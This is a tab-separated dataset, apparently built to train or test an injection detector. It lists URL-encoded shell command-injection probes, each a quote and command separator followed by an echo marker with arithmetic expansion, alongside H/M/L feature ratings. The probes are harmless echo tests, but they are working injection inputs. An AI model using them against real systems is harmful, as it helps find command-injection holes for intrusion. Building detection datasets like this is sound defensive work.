attack	d_char	d_token_sqli	d_token_xss	d_token_ci	punck	s_token	space	length	output
'%20echo%20dcfstx$((93%2b73))$(echo%20dcfstx)dcfstx%27	H	L	L	L	M	M	L	M	
';echo%20hpsgqk$((19%2b98))$(echo%20hpsgqk)hpsgqk%27	M	L	L	L	M	M	L	M	
'&echo%20lttpnv$((10%2b90))$(echo%20lttpnv)lttpnv%27	M	L	L	L	M	M	L	M	
'|echo%20rakmks$((5%2b89))$(echo%20rakmks)rakmks%27	M	L	L	L	M	M	L	M	
'||echo%20sgxvwy$((48%2b78))$(echo%20sgxvwy)sgxvwy%27	M	L	L	L	M	M	L	M	
'&&echo%20xocejg$((66%2b21))$(echo%20xocejg)xocejg%27	M	L	L	L	M	M	L	M	
'%0aecho%20ppskos$((66%2b51))$(echo%20ppskos)ppskos%27	H	L	L	L	M	M	L	M	
'%3becho%20hkyegb$((78%2b19))$(echo%20hkyegb)hkyegb%27	H	L	L	L	M	M	L	M	
'%26echo%20yriynd$((40%2b81))$(echo%20yriynd)yriynd%27	H	L	L	L	M	M	L	M	
'%26%26echo%20swzbkk$((94%2b84))$(echo%20swzbkk)swzbkk%27	H	L	L	L	M	M	L	M	
'%7cecho%20kieldl$((12%2b2))$(echo%20kieldl)kieldl%27	H	L	L	L	M	M	L	M	
'%7c%7cecho%20axsulh$((48%2b60))$(echo%20axsulh)axsulh%27	H	L	L	L	M	M	L	M	
'echo%20wibnds$((23%2b85))$(echo%20wibnds)wibnds%22	M	L	L	L	M	M	L	M	
'%20echo%20hbufgz$((85%2b26))$(echo%20hbufgz)hbufgz%22	H	L	L	L	M	M	L	M	
';echo%20rhftcs$((28%2b7))$(echo%20rhftcs)rhftcs%22	M	L	L	L	M	M	L	M	
'&echo%20rjccat$((53%2b34))$(echo%20rjccat)rjccat%22	M	L	L	L	M	M	L	M	
'|echo%20utcppj$((1%2b15))$(echo%20utcppj)utcppj%22	M	L	L	L	M	M	L	M	
'||echo%20dnohyc$((47%2b59))$(echo%20dnohyc)dnohyc%22	M	L	L	L	M	M	L	M	
'&&echo%20sxujkt$((94%2b38))$(echo%20sxujkt)sxujkt%22	M	L	L	L	M	M	L	M	
'%0aecho%20gggpwe$((90%2b87))$(echo%20gggpwe)gggpwe%22	H	L	L	L	M	M	L	M	
'%3becho%20wijqld$((58%2b39))$(echo%20wijqld)wijqld%22	H	L	L	L	M	M	L	M	
'%26echo%20pxnvtz$((92%2b1))$(echo%20pxnvtz)pxnvtz%22	H	L	L	L	M	M	L	M	
'%26%26echo%20ddhyjg$((44%2b11))$(echo%20ddhyjg)ddhyjg%22	H	L	L	L	M	M	L	M	
'%7cecho%20wusbmh$((6%2b46))$(echo%20wusbmh)wusbmh%22	H	L	L	L	M	M	L	M	
'%7c%7cecho%20zjaxer$((49%2b60))$(echo%20zjaxer)zjaxer%22	H	L	L	L	M	M	L	M	
'echo%20gzxgvn$((4%2b70))$(echo%20gzxgvn)gzxgvn%5c%5c	H	L	L	L	M	M	L	M	
'%20echo%20uxktuc$((59%2b25))$(echo%20uxktuc)uxktuc%5c%5c	H	L	L	L	M	M	L	M	
';echo%20kkgoua$((23%2b96))$(echo%20kkgoua)kkgoua%5c%5c	H	L	L	L	M	M	L	M	
'&echo%20qfgfep$((28%2b72))$(echo%20qfgfep)qfgfep%5c%5c	H	L	L	L	M	M	L	M	
'|echo%20lrgwpw$((14%2b39))$(echo%20lrgwpw)lrgwpw%5c%5c	H	L	L	L	M	M	L	M	
'||echo%20anrndb$((81%2b57))$(echo%20anrndb)anrndb%5c%5c	H	L	L	L	M	M	L	M	
'&&echo%20xwgnwj$((33%2b16))$(echo%20xwgnwj)xwgnwj%5c%5c	H	L	L	L	M	M	L	M	
'%0aecho%20imhmuf$((78%2b85))$(echo%20imhmuf)imhmuf%5c%5c	H	L	L	L	M	M	L	M	
'%3becho%20jprqkb$((93%2b89))$(echo%20jprqkb)jprqkb%5c%5c	H	L	L	L	M	M	L	M	
'%26echo%20nkmkni$((64%2b82))$(echo%20nkmkni)nkmkni%5c%5c	H	L	L	L	M	M	L	M	
'%26%26echo%20pmwjrh$((60%2b59))$(echo%20pmwjrh)pmwjrh%5c%5c	H	L	L	L	M	M	L	M	
'%7cecho%20rhsirj$((85%2b6))$(echo%20rhsirj)rhsirj%5c%5c	H	L	L	L	M	M	L	M	
'%7c%7cecho%20nebejr$((3%2b38))$(echo%20nebejr)nebejr%5c%5c	H	L	L	L	M	M	L	M	
'echo%20olrhzx$((22%2b72))$(echo%20olrhzx)olrhzx%2f%2f	H	L	L	L	M	M	L	M	
'%20echo%20pprcps$((95%2b69))$(echo%20pprcps)pprcps%2f%2f	H	L	L	L	M	M	L	M	
';echo%20icitts$((63%2b83))$(echo%20icitts)icitts%2f%2f	H	L	L	L	M	M	L	M	
'&echo%20fxsadu$((58%2b85))$(echo%20fxsadu)fxsadu%2f%2f	H	L	L	L	M	M	L	M	
'|echo%20ninplo$((85%2b22))$(echo%20ninplo)ninplo%2f%2f	H	L	L	L	M	M	L	M	
'||echo%20uapczm$((19%2b50))$(echo%20uapczm)uapczm%2f%2f	H	L	L	L	M	M	L	M	
'&&echo%20jgtges$((48%2b34))$(echo%20jgtges)jgtges%2f%2f	H	L	L	L	M	M	L	M	
'%0aecho%20qvuncp$((53%2b11))$(echo%20qvuncp)qvuncp%2f%2f	H	L	L	L	M	M	L	M	
'%3becho%20ghqcjv$((24%2b65))$(echo%20ghqcjv)ghqcjv%2f%2f	H	L	L	L	M	M	L	M	
'%26echo%20zxujmm$((66%2b53))$(echo%20zxujmm)zxujmm%2f%2f	H	L	L	L	M	M	L	M	
'%26%26echo%20uwwbjc$((28%2b91))$(echo%20uwwbjc)uwwbjc%2f%2f	H	L	L	L	M	M	L	M	
'%7cecho%20zganeq$((95%2b91))$(echo%20zganeq)zganeq%2f%2f	H	L	L	L	M	M	L	M	
'%7c%7cecho%20wvnprw$((44%2b23))$(echo%20wvnprw)wvnprw%2f%2f	H	L	L	L	M	M	L	M	
'echo%20zqodfo$((38%2b30))$(echo%20zqodfo)zqodfo%26	M	L	L	L	M	M	L	M	
'%20echo%20vbrtzg$((57%2b99))$(echo%20vbrtzg)vbrtzg%26	H	L	L	L	M	M	L	M	
';echo%20edeyqk$((45%2b89))$(echo%20edeyqk)edeyqk%26	M	L	L	L	M	M	L	M	
'&echo%20huewvl$((15%2b9))$(echo%20huewvl)huewvl%26	M	L	L	L	M	M	L	M	
'|echo%20fwjjdn$((64%2b27))$(echo%20fwjjdn)fwjjdn%26	M	L	L	L	M	M	L	M	
'||echo%20djiupg$((86%2b80))$(echo%20djiupg)djiupg%26	M	L	L	L	M	M	L	M	
'&&echo%20lqmldz$((74%2b43))$(echo%20lqmldz)lqmldz%26	M	L	L	L	M	M	L	M	
'%0aecho%20vechdm$((44%2b40))$(echo%20vechdm)vechdm%26	H	L	L	L	M	M	L	M	
'%3becho%20zpqvvv$((58%2b25))$(echo%20zpqvvv)zpqvvv%26	H	L	L	L	M	M	L	M	
'%26echo%20ieczza$((76%2b1))$(echo%20ieczza)ieczza%26	H	L	L	L	M	M	L	M	
'%26%26echo%20wrwtas$((61%2b67))$(echo%20wrwtas)wrwtas%26	H	L	L	L	M	M	L	M	
'%7cecho%20vbtziy$((45%2b53))$(echo%20vbtziy)vbtziy%26	H	L	L	L	M	M	L	M	
'%7c%7cecho%20qowwzu$((31%2b94))$(echo%20qowwzu)qowwzu%26	H	L	L	L	M	M	L	M	
'echo%20nixaxb$((47%2b23))$(echo%20nixaxb)nixaxb%7c	M	L	L	L	M	M	L	M	
'%20echo%20mivihv$((7%2b58))$(echo%20mivihv)mivihv%7c	H	L	L	L	M	M	L	M	
';echo%20cyloat$((50%2b30))$(echo%20cyloat)cyloat%7c	M	L	L	L	M	M	L	M	
'&echo%20whtjdf$((87%2b5))$(echo%20whtjdf)whtjdf%7c	M	L	L	L	M	M	L	M	
'|echo%20dtsqrm$((82%2b33))$(echo%20dtsqrm)dtsqrm%7c	M	L	L	L	M	M	L	M	
'||echo%20spfqxr$((54%2b70))$(echo%20spfqxr)spfqxr%7c	M	L	L	L	M	M	L	M	
'&&echo%20tqzuum$((43%2b5))$(echo%20tqzuum)tqzuum%7c	M	L	L	L	M	M	L	M	
'%0aecho%20lrjxvv$((74%2b11))$(echo%20lrjxvv)lrjxvv%7c	H	L	L	L	M	M	L	M	
'%3becho%20qgyqup$((35%2b73))$(echo%20qgyqup)qgyqup%7c	H	L	L	L	M	M	L	M	
'%26echo%20synxtk$((0%2b99))$(echo%20synxtk)synxtk%7c	H	L	L	L	M	M	L	M	
'%26%26echo%20miqkpq$((80%2b18))$(echo%20miqkpq)miqkpq%7c	H	L	L	L	M	M	L	M	
'%7cecho%20hkfpkh$((65%2b16))$(echo%20hkfpkh)hkfpkh%7c	H	L	L	L	M	M	L	M	
'%7c%7cecho%20fufipg$((27%2b62))$(echo%20fufipg)fufipg%7c	H	L	L	L	M	M	L	M	
"echo%20ufagyk$((82%2b39))$(echo%20ufagyk)ufagyk	M	L	L	L	M	M	L	M	
"%20echo%20ixtsza$((19%2b14))$(echo%20ixtsza)ixtsza	M	L	L	L	M	M	L	M	
";echo%20bjmuos$((51%2b32))$(echo%20bjmuos)bjmuos	M	L	L	L	M	M	L	M	
"&echo%20cyvxhl$((2%2b25))$(echo%20cyvxhl)cyvxhl	M	L	L	L	M	M	L	M	
"|echo%20jfffck$((98%2b39))$(echo%20jfffck)jfffck	M	L	L	L	M	M	L	M	
"||echo%20jzkwax$((82%2b62))$(echo%20jzkwax)jzkwax	M	L	L	L	M	M	L	M	
"&&echo%20pfnzyt$((53%2b30))$(echo%20pfnzyt)pfnzyt	M	L	L	L	M	M	L	M	
"%0aecho%20cjdavc$((37%2b56))$(echo%20cjdavc)cjdavc	M	L	L	L	M	M	L	M	
"%3becho%20xkmixj$((55%2b55))$(echo%20xkmixj)xkmixj	M	L	L	L	M	M	L	M	
"%26echo%20xpabsl$((91%2b48))$(echo%20xpabsl)xpabsl	M	L	L	L	M	M	L	M	
"%26%26echo%20msodxx$((98%2b77))$(echo%20msodxx)msodxx	H	L	L	L	M	M	L	M	
"%7cecho%20niussd$((14%2b80))$(echo%20niussd)niussd	M	L	L	L	M	M	L	M	
"%7c%7cecho%20zxhqbt$((34%2b29))$(echo%20zxhqbt)zxhqbt	H	L	L	L	M	M	L	M	
"echo%20lroqvj$((59%2b51))$(echo%20lroqvj)lroqvj'	M	L	L	L	M	M	L	M	
"%20echo%20awpudf$((45%2b83))$(echo%20awpudf)awpudf'	H	L	L	L	M	M	L	M	
";echo%20dhcqnm$((60%2b94))$(echo%20dhcqnm)dhcqnm'	M	L	L	L	M	M	L	M	
"&echo%20amsblu$((47%2b94))$(echo%20amsblu)amsblu'	M	L	L	L	M	M	L	M	
"|echo%20dkgjrp$((17%2b97))$(echo%20dkgjrp)dkgjrp'	M	L	L	L	M	M	L	M	
"||echo%20tabsem$((52%2b6))$(echo%20tabsem)tabsem'	M	L	L	L	M	M	L	M	
"&&echo%20ypkeuz$((26%2b62))$(echo%20ypkeuz)ypkeuz'	M	L	L	L	M	M	L	M	
"%0aecho%20uifjem$((39%2b5))$(echo%20uifjem)uifjem'	H	L	L	L	M	M	L	M	
"%3becho%20rbdsuf$((59%2b65))$(echo%20rbdsuf)rbdsuf'	H	L	L	L	M	M	L	M	
"%26echo%20hkwalz$((5%2b31))$(echo%20hkwalz)hkwalz'	H	L	L	L	M	M	L	M	
"%26%26echo%20xhyruc$((45%2b24))$(echo%20xhyruc)xhyruc'	H	L	L	L	M	M	L	M	
"%7cecho%20jztydr$((14%2b40))$(echo%20jztydr)jztydr'	H	L	L	L	M	M	L	M	
"%7c%7cecho%20bomiap$((85%2b40))$(echo%20bomiap)bomiap'	H	L	L	L	M	M	L	M	
"echo%20ueuagm$((11%2b22))$(echo%20ueuagm)ueuagm"	M	L	L	L	M	M	L	M	
"%20echo%20iwyyyv$((59%2b47))$(echo%20iwyyyv)iwyyyv"	H	L	L	L	M	M	L	M	
";echo%20nuurlg$((10%2b93))$(echo%20nuurlg)nuurlg"	M	L	L	L	M	M	L	M	
"&echo%20dtxnay$((11%2b40))$(echo%20dtxnay)dtxnay"	M	L	L	L	M	M	L	M	
"|echo%20uprlnq$((23%2b4))$(echo%20uprlnq)uprlnq"	M	L	L	L	M	M	L	M	
"||echo%20vkpfap$((92%2b94))$(echo%20vkpfap)vkpfap"	M	L	L	L	M	M	L	M	
"&&echo%20kwprcs$((3%2b21))$(echo%20kwprcs)kwprcs"	M	L	L	L	M	M	L	M	
"%0aecho%20mjvqyb$((44%2b28))$(echo%20mjvqyb)mjvqyb"	H	L	L	L	M	M	L	M	
"%3becho%20tmwmct$((51%2b35))$(echo%20tmwmct)tmwmct"	H	L	L	L	M	M	L	M	
"%26echo%20hccvwb$((30%2b94))$(echo%20hccvwb)hccvwb"	H	L	L	L	M	M	L	M	
"%26%26echo%20geoqbm$((28%2b12))$(echo%20geoqbm)geoqbm"	H	L	L	L	M	M	L	M	
"%7cecho%20fczdsm$((68%2b91))$(echo%20fczdsm)fczdsm"	H	L	L	L	M	M	L	M	
"%7c%7cecho%20htpemj$((2%2b19))$(echo%20htpemj)htpemj"	H	L	L	L	M	M	L	M	
"echo%20oqtveh$((73%2b9))$(echo%20oqtveh)oqtveh	M	L	L	L	M	M	L	M	
"%20echo%20qiohvo$((71%2b18))$(echo%20qiohvo)qiohvo	M	L	L	L	M	M	L	M	
";echo%20hiencf$((0%2b66))$(echo%20hiencf)hiencf	M	L	L	L	M	M	L	M	
"&echo%20ibiyqc$((4%2b38))$(echo%20ibiyqc)ibiyqc	M	L	L	L	M	M	L	M	
"|echo%20fobrpz$((91%2b99))$(echo%20fobrpz)fobrpz	M	L	L	L	M	M	L	M	
"||echo%20kviafy$((17%2b57))$(echo%20kviafy)kviafy	M	L	L	L	M	M	L	M	
"&&echo%20iqztqy$((96%2b36))$(echo%20iqztqy)iqztqy	M	L	L	L	M	M	L	M	
"%0aecho%20pnfttq$((20%2b65))$(echo%20pnfttq)pnfttq	M	L	L	L	M	M	L	M	
"%3becho%20pdmnti$((23%2b51))$(echo%20pdmnti)pdmnti	M	L	L	L	M	M	L	M	
"%26echo%20qkcgpp$((73%2b25))$(echo%20qkcgpp)qkcgpp	M	L	L	L	M	M	L	M	
"%26%26echo%20ijqidw$((5%2b53))$(echo%20ijqidw)ijqidw	H	L	L	L	M	M	L	M	
"%7cecho%20ziycef$((9%2b56))$(echo%20ziycef)ziycef	M	L	L	L	M	M	L	M	
"%7c%7cecho%20omofyd$((86%2b53))$(echo%20omofyd)omofyd	H	L	L	L	M	M	L	M	
"echo%20srqcvs$((48%2b38))$(echo%20srqcvs)srqcvs//	M	L	L	L	M	M	L	M	
"%20echo%20bynnoq$((5%2b9))$(echo%20bynnoq)bynnoq//	M	L	L	L	M	M	L	M	
";echo%20ofzrpb$((30%2b95))$(echo%20ofzrpb)ofzrpb//	M	L	L	L	M	M	L	M	
"&echo%20qzcvqa$((19%2b81))$(echo%20qzcvqa)qzcvqa//	M	L	L	L	M	M	L	M	
"|echo%20xlpjuh$((63%2b35))$(echo%20xlpjuh)xlpjuh//	M	L	L	L	M	M	L	M	
"||echo%20gircrn$((15%2b16))$(echo%20gircrn)gircrn//	M	L	L	L	M	M	L	M	
"&&echo%20kxebps$((55%2b92))$(echo%20kxebps)kxebps//	M	L	L	L	M	M	L	M	
"%0aecho%20jcefay$((97%2b37))$(echo%20jcefay)jcefay//	M	L	L	L	M	M	L	M	
"%3becho%20mdsqta$((24%2b10))$(echo%20mdsqta)mdsqta//	M	L	L	L	M	M	L	M	
"%26echo%20aikvyl$((27%2b44))$(echo%20aikvyl)aikvyl//	M	L	L	L	M	M	L	M	
"%26%26echo%20yuqtkp$((71%2b23))$(echo%20yuqtkp)yuqtkp//	H	L	L	L	M	M	L	M	
"%7cecho%20gpgsxe$((20%2b85))$(echo%20gpgsxe)gpgsxe//	M	L	L	L	M	M	L	M	
"%7c%7cecho%20jdtyjx$((18%2b24))$(echo%20jdtyjx)jdtyjx//	H	L	L	L	M	M	L	M	
"echo%20uwnjqe$((91%2b46))$(echo%20uwnjqe)uwnjqe\	M	L	L	L	M	M	L	M	
"%20echo%20tzznsl$((92%2b66))$(echo%20tzznsl)tzznsl\	M	L	L	L	M	M	L	M	
";echo%20ijtgyu$((36%2b47))$(echo%20ijtgyu)ijtgyu\	M	L	L	L	M	M	L	M	
"&echo%20trmptd$((48%2b23))$(echo%20trmptd)trmptd\	M	L	L	L	M	M	L	M	
"|echo%20eeoghf$((87%2b30))$(echo%20eeoghf)eeoghf\	M	L	L	L	M	M	L	M	
"||echo%20exjsnr$((49%2b13))$(echo%20exjsnr)exjsnr\	M	L	L	L	M	M	L	M	
"&&echo%20pmirhd$((95%2b94))$(echo%20pmirhd)pmirhd\	M	L	L	L	M	M	L	M	
"%0aecho%20pzdpmf$((67%2b92))$(echo%20pzdpmf)pzdpmf\	M	L	L	L	M	M	L	M	
"%3becho%20ofkrsw$((4%2b25))$(echo%20ofkrsw)ofkrsw\	M	L	L	L	M	M	L	M	
"%26echo%20mbgkin$((22%2b60))$(echo%20mbgkin)mbgkin\	M	L	L	L	M	M	L	M	
"%26%26echo%20fgfior$((55%2b25))$(echo%20fgfior)fgfior\	H	L	L	L	M	M	L	M	
"%7cecho%20xtlldx$((25%2b20))$(echo%20xtlldx)xtlldx\	M	L	L	L	M	M	L	M	
"%7c%7cecho%20hkhvfc$((85%2b7))$(echo%20hkhvfc)hkhvfc\	H	L	L	L	M	M	L	M	
"echo%20tpiixd$((67%2b79))$(echo%20tpiixd)tpiixd&	M	L	L	L	M	M	L	M	
"%20echo%20fekbsb$((80%2b66))$(echo%20fekbsb)fekbsb&	M	L	L	L	M	M	L	M	
";echo%20dnjxzb$((38%2b82))$(echo%20dnjxzb)dnjxzb&	M	L	L	L	M	M	L	M	
"&echo%20jnxuvw$((81%2b20))$(echo%20jnxuvw)jnxuvw&	M	L	L	L	M	M	L	M	
"|echo%20bkrujq$((5%2b96))$(echo%20bkrujq)bkrujq&	M	L	L	L	M	M	L	M	
"||echo%20tnfytm$((72%2b96))$(echo%20tnfytm)tnfytm&	M	L	L	L	M	M	L	M	
"&&echo%20aeaxjf$((73%2b78))$(echo%20aeaxjf)aeaxjf&	M	L	L	L	M	M	L	M	
"%0aecho%20ddwdpn$((91%2b29))$(echo%20ddwdpn)ddwdpn&	M	L	L	L	M	M	L	M	
"%3becho%20uzgzpc$((74%2b69))$(echo%20uzgzpc)uzgzpc&	M	L	L	L	M	M	L	M	
"%26echo%20cxiglr$((26%2b78))$(echo%20cxiglr)cxiglr&	M	L	L	L	M	M	L	M	
"%26%26echo%20exrbwp$((2%2b65))$(echo%20exrbwp)exrbwp&	H	L	L	L	M	M	L	M	
"%7cecho%20zofkjo$((5%2b82))$(echo%20zofkjo)zofkjo&	M	L	L	L	M	M	L	M	
"%7c%7cecho%20cttivx$((65%2b14))$(echo%20cttivx)cttivx&	H	L	L	L	M	M	L	M	
"echo%20nmpyvc$((95%2b49))$(echo%20nmpyvc)nmpyvc|	M	L	L	L	M	M	L	M	
"%20echo%20ctftcj$((80%2b91))$(echo%20ctftcj)ctftcj|	M	L	L	L	M	M	L	M	
";echo%20qbisfh$((85%2b18))$(echo%20qbisfh)qbisfh|	M	L	L	L	M	M	L	M	
"&echo%20ccwsns$((52%2b72))$(echo%20ccwsns)ccwsns|	M	L	L	L	M	M	L	M	
"|echo%20iiwztv$((37%2b92))$(echo%20iiwztv)iiwztv|	M	L	L	L	M	M	L	M	
"||echo%20dkoiiu$((52%2b39))$(echo%20dkoiiu)dkoiiu|	M	L	L	L	M	M	L	M	
"&&echo%20elggdq$((2%2b5))$(echo%20elggdq)elggdq|	M	L	L	L	M	M	L	M	
"%0aecho%20qbfoyy$((28%2b31))$(echo%20qbfoyy)qbfoyy|	M	L	L	L	M	M	L	M	
"%3becho%20qatqcm$((57%2b7))$(echo%20qatqcm)qatqcm|	M	L	L	L	M	M	L	M	
"%26echo%20xkuypf$((60%2b61))$(echo%20xkuypf)xkuypf|	M	L	L	L	M	M	L	M	
"%26%26echo%20dbnqdd$((96%2b50))$(echo%20dbnqdd)dbnqdd|	H	L	L	L	M	M	L	M	
"%7cecho%20baerum$((15%2b78))$(echo%20baerum)baerum|	M	L	L	L	M	M	L	M	
"%7c%7cecho%20ffarmz$((95%2b61))$(echo%20ffarmz)ffarmz|	H	L	L	L	M	M	L	M	
"echo%20mjejve$((54%2b9))$(echo%20mjejve)mjejve%27	M	L	L	L	M	M	L	M	
"%20echo%20lrnmxi$((82%2b72))$(echo%20lrnmxi)lrnmxi%27	H	L	L	L	M	M	L	M	
";echo%20qnioig$((45%2b76))$(echo%20qnioig)qnioig%27	M	L	L	L	M	M	L	M	
"&echo%20tfmdgn$((33%2b82))$(echo%20tfmdgn)tfmdgn%27	M	L	L	L	M	M	L	M	
"|echo%20cctrqp$((48%2b16))$(echo%20cctrqp)cctrqp%27	M	L	L	L	M	M	L	M	
"||echo%20sahvef$((53%2b99))$(echo%20sahvef)sahvef%27	M	L	L	L	M	M	L	M	
"&&echo%20skqwdw$((71%2b38))$(echo%20skqwdw)skqwdw%27	M	L	L	L	M	M	L	M	
"%0aecho%20lfvtxu$((70%2b65))$(echo%20lfvtxu)lfvtxu%27	H	L	L	L	M	M	L	M	
"%3becho%20krgulu$((96%2b71))$(echo%20krgulu)krgulu%27	H	L	L	L	M	M	L	M	
"%26echo%20whbqcr$((5%2b15))$(echo%20whbqcr)whbqcr%27	H	L	L	L	M	M	L	M	
"%26%26echo%20numbrk$((29%2b87))$(echo%20numbrk)numbrk%27	H	L	L	L	M	M	L	M	
"%7cecho%20ngisbi$((50%2b27))$(echo%20ngisbi)ngisbi%27	H	L	L	L	M	M	L	M	
"%7c%7cecho%20oesdwi$((60%2b61))$(echo%20oesdwi)oesdwi%27	H	L	L	L	M	M	L	M	
"echo%20xfgdcc$((53%2b64))$(echo%20xfgdcc)xfgdcc%22	M	L	L	L	M	M	L	M	
"%20echo%20bzqfls$((30%2b41))$(echo%20bzqfls)bzqfls%22	H	L	L	L	M	M	L	M	
";echo%20kgvzyk$((88%2b50))$(echo%20kgvzyk)kgvzyk%22	M	L	L	L	M	M	L	M	
"&echo%20ilawbp$((7%2b21))$(echo%20ilawbp)ilawbp%22	M	L	L	L	M	M	L	M	
"|echo%20lyymlj$((68%2b90))$(echo%20lyymlj)lyymlj%22	M	L	L	L	M	M	L	M	
"||echo%20rjzlgg$((1%2b14))$(echo%20rjzlgg)rjzlgg%22	M	L	L	L	M	M	L	M	
"&&echo%20iwmdnd$((49%2b2))$(echo%20iwmdnd)iwmdnd%22	M	L	L	L	M	M	L	M	
"%0aecho%20zrduwp$((33%2b75))$(echo%20zrduwp)zrduwp%22	H	L	L	L	M	M	L	M	
"%3becho%20mmykat$((11%2b87))$(echo%20mmykat)mmykat%22	H	L	L	L	M	M	L	M	
"%26echo%20ywvnnt$((69%2b85))$(echo%20ywvnnt)ywvnnt%22	H	L	L	L	M	M	L	M	
"%26%26echo%20hnbmvy$((5%2b65))$(echo%20hnbmvy)hnbmvy%22	H	L	L	L	M	M	L	M	
"%7cecho%20wyanek$((66%2b6))$(echo%20wyanek)wyanek%22	H	L	L	L	M	M	L	M	
"%7c%7cecho%20nvziaz$((98%2b45))$(echo%20nvziaz)nvziaz%22	H	L	L	L	M	M	L	M	
"echo%20vtsnky$((47%2b67))$(echo%20vtsnky)vtsnky%5c%5c	H	L	L	L	M	M	L	M	
"%20echo%20ktlvza$((31%2b12))$(echo%20ktlvza)ktlvza%5c%5c	H	L	L	L	M	M	L	M	
";echo%20lwiari$((77%2b11))$(echo%20lwiari)lwiari%5c%5c	H	L	L	L	M	M	L	M	
"&echo%20ymchjb$((38%2b99))$(echo%20ymchjb)ymchjb%5c%5c	H	L	L	L	M	M	L	M	
"|echo%20ddrlvr$((41%2b36))$(echo%20ddrlvr)ddrlvr%5c%5c	H	L	L	L	M	M	L	M	
"||echo%20omahvh$((14%2b99))$(echo%20omahvh)omahvh%5c%5c	H	L	L	L	M	M	L	M	
"&&echo%20pisjqq$((33%2b72))$(echo%20pisjqq)pisjqq%5c%5c	H	L	L	L	M	M	L	M	
"%0aecho%20suqjya$((1%2b59))$(echo%20suqjya)suqjya%5c%5c	H	L	L	L	M	M	L	M	
"%3becho%20wadyuk$((6%2b43))$(echo%20wadyuk)wadyuk%5c%5c	H	L	L	L	M	M	L	M	
"%26echo%20tgsmri$((56%2b34))$(echo%20tgsmri)tgsmri%5c%5c	H	L	L	L	M	M	L	M	
"%26%26echo%20ffnjfe$((44%2b38))$(echo%20ffnjfe)ffnjfe%5c%5c	H	L	L	L	M	M	L	M	
"%7cecho%20qafeav$((75%2b66))$(echo%20qafeav)qafeav%5c%5c	H	L	L	L	M	M	L	M	
"%7c%7cecho%20phpvas$((47%2b19))$(echo%20phpvas)phpvas%5c%5c	H	L	L	L	M	M	L	M	
"echo%20epdilq$((5%2b61))$(echo%20epdilq)epdilq%2f%2f	H	L	L	L	M	M	L	M	
"%20echo%20kglfre$((0%2b31))$(echo%20kglfre)kglfre%2f%2f	H	L	L	L	M	M	L	M	
";echo%20exoudi$((91%2b14))$(echo%20exoudi)exoudi%2f%2f	H	L	L	L	M	M	L	M	
"&echo%20mtbnoe$((46%2b26))$(echo%20mtbnoe)mtbnoe%2f%2f	H	L	L	L	M	M	L	M	
"|echo%20cptrgo$((21%2b79))$(echo%20cptrgo)cptrgo%2f%2f	H	L	L	L	M	M	L	M	
"||echo%20qdyned$((79%2b86))$(echo%20qdyned)qdyned%2f%2f	H	L	L	L	M	M	L	M	
"&&echo%20nmvrbb$((60%2b26))$(echo%20nmvrbb)nmvrbb%2f%2f	H	L	L	L	M	M	L	M	
"%0aecho%20bghkom$((19%2b31))$(echo%20bghkom)bghkom%2f%2f	H	L	L	L	M	M	L	M	
"%3becho%20nqdgay$((73%2b33))$(echo%20nqdgay)nqdgay%2f%2f	H	L	L	L	M	M	L	M	
"%26echo%20qsdxqr$((21%2b3))$(echo%20qsdxqr)qsdxqr%2f%2f	H	L	L	L	M	M	L	M	
"%26%26echo%20kaopjj$((97%2b96))$(echo%20kaopjj)kaopjj%2f%2f	H	L	L	L	M	M	L	M	
"%7cecho%20fxxyal$((38%2b83))$(echo%20fxxyal)fxxyal%2f%2f	H	L	L	L	M	M	L	M	
"%7c%7cecho%20ubezea$((22%2b25))$(echo%20ubezea)ubezea%2f%2f	H	L	L	L	M	M	L	M	
"echo%20wxrsmm$((62%2b81))$(echo%20wxrsmm)wxrsmm%26	M	L	L	L	M	M	L	M	
"%20echo%20oqftmt$((91%2b48))$(echo%20oqftmt)oqftmt%26	H	L	L	L	M	M	L	M	
";echo%20klodwm$((81%2b43))$(echo%20klodwm)klodwm%26	M	L	L	L	M	M	L	M	
"&echo%20lhbnpu$((26%2b5))$(echo%20lhbnpu)lhbnpu%26	M	L	L	L	M	M	L	M	
"|echo%20glnwtr$((75%2b96))$(echo%20glnwtr)glnwtr%26	M	L	L	L	M	M	L	M	
"||echo%20grzssh$((83%2b88))$(echo%20grzssh)grzssh%26	M	L	L	L	M	M	L	M	
"&&echo%20fllkbg$((76%2b53))$(echo%20fllkbg)fllkbg%26	M	L	L	L	M	M	L	M	
"%0aecho%20qbalef$((39%2b26))$(echo%20qbalef)qbalef%26	H	L	L	L	M	M	L	M	
"%3becho%20wvydhu$((64%2b10))$(echo%20wvydhu)wvydhu%26	H	L	L	L	M	M	L	M	
